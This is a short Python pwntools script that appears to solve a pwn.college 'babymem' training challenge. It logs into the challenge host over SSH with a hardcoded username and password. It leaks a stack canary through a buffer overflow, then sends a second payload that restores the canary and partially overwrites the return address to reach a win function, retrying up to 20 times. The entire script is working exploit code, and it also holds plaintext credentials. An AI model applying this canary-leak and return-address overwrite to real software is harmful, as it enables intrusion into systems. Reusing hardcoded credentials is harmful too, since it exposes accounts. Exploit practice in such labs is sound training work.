from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")

# context.log_level = 'debug'
for i in range(20):
    # p = process('./babymem_level12_testing1')
    p = s.process("./babymem_level12_testing1")
    p.sendlineafter(b'Payload size: ',b'1000')
    pay = b'REPEAT'
    pay = pay.ljust((0x88-0x10),b'A')
    pay += b'!'
    p.sendafter(b'bytes)!\n',pay)
    p.recvuntil(b'!')
    canary = u64(b'\x00'+p.recv(7))
    print(hex(canary))
    p.sendlineafter(b'Payload size: ',b'1000')
    pay = b'A'*(0x88-0x10) + p64(canary) + b'B'*8 + p16(0x34EB)
    # pause()
    p.sendafter(b'bytes)!\n',pay)
    data = p.recv(1024)
    if b'win!' in data:
        print(data)
        p.interactive()